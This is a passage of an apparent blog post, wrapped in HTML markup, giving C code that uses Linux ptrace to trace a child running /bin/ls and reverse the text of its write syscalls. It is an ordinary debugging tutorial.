style="line-height: 21.6000003814697px">&#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // POKEDATA counter</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; int counter = 0;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // POKEDATA max count</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; int maxCount = dataLen / sizeof(long);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // data left length (prevent out of range in memory when written)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; int dataLeftLen = dataLen % sizeof(long);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // moving pointer</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; void * p_moving = p_data;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // write part of data which align to sizeof(long)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; int ret;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; while (counter &lt; maxCount)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; memset(&amp;converter, 0, sizeof(long));</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; memcpy(converter.strData, p_moving, sizeof(long));</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; ret = ptrace(PTRACE_POKEDATA, child, dataAddr + counter * sizeof(long), converter.rawData);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; if (ret &lt; 0)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; perror(&quot;ptrace poke data error : &quot;);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; p_moving += sizeof(long);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; counter++;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // write data left</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; if (dataLeftLen != 0)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; memset(&amp;converter, 0, sizeof(long));</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; memcpy(converter.strData, p_moving, dataLeftLen);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; ret = ptrace(PTRACE_POKEDATA, child, dataAddr + counter * sizeof(long), converter.rawData);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; if (ret &lt; 0)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; perror(&quot;ptrace poke data error : &quot;);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">void reverseStr(char * p_str)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; int strLen = strlen(p_str);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; char * p_head = p_str;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; char * p_tail = p_str + strLen - 1;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; char tempCh;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; // skip '&#92;n'</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; if (*p_tail == '&#92;n')</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; p_tail--;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; //exchange char</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; while (p_head &lt; p_tail)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; tempCh = *p_head;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; *p_head = *p_tail;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; *p_tail = tempCh;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; p_head++;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; p_tail--;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">void debugRegs(struct user_regs_struct * p_regs )&nbsp;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; printf(&quot;syscall param DS = %llu&#92;n&quot;, p_regs-&gt;ds);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; printf(&quot;syscall param RSI = %llu&#92;n&quot;, p_regs-&gt;rsi);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; printf(&quot;syscall param ES = %llu&#92;n&quot;, p_regs-&gt;es);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; printf(&quot;syscall param RDI = %llu&#92;n&quot;, p_regs-&gt;rdi);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; printf(&quot;syscall return RAX = %llu&#92;n&quot;, p_regs-&gt;rax);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; printf(&quot;syscall param RBX = %llu&#92;n&quot;, p_regs-&gt;rbx);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; printf(&quot;syscall param RCX = %llu&#92;n&quot;, p_regs-&gt;rcx);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; printf(&quot;syscall param RDX = %llu&#92;n&quot;, p_regs-&gt;rdx);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">int main()</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; pid_t child = fork();</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; if(child == 0)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; ptrace(PTRACE_TRACEME, 0, NULL, NULL);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; // make a syscall(SYS_write)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; else</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; int status;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; // SYS_write will be called twice, one is entry, another is exit, so we mark it</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; unsigned int calledCount = 0;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; while (1)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; wait(&amp;status);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; if (WIFEXITED(status))</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; break;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; // PEEK regs to find the syscall(SYS_execve)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; struct user_regs_struct regs;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; ptrace(PTRACE_GETREGS, child, NULL, &amp;regs);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; // catch it!</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; if (regs.orig_rax == SYS_write)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (calledCount == 0)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; calledCount = 1;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // debugRegs(&amp;regs);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; char * p_dataStr = (char *) malloc((regs.rdx + 1) * sizeof(char));</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (p_dataStr == NULL)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; getData(child, regs.ds * OFFSET_UNIT + regs.rsi, regs.rdx, p_dataStr);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; reverseStr(p_dataStr);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; setData(child, regs.ds * OFFSET_UNIT + regs.rsi, regs.rdx, p_dataStr);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else if (calledCount == 1)</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // debugRegs(&amp;regs);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; &nbsp; ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &nbsp; 